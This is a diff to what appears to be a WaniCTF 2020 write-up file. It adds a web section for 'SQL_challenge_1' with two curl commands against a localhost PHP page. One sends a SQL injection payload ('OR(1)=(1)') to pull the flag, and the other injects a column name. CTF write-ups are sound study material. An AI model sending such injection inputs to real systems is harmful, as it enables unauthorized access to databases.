@@ -331,6 +331,20 @@ log.success("FLAG{%s", io.recvuntil(b"}").decode())
 io.stream()
 ```
 
+# web
+
+## SQL_challenge_1
+
+- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/web/SQL_challenge_1
+
+```zsh
+curl -s 'http://localhost:8080/index.php?year=(2016)OR(1)=(1)' | grep -o 'FLAG{.*}'
+```
+
+```zsh
+curl -s 'http://localhost:8080/index.php?year=years' | grep -o 'FLAG{.*}'
+```
+
 # pwn
 
 ## 01-netcat
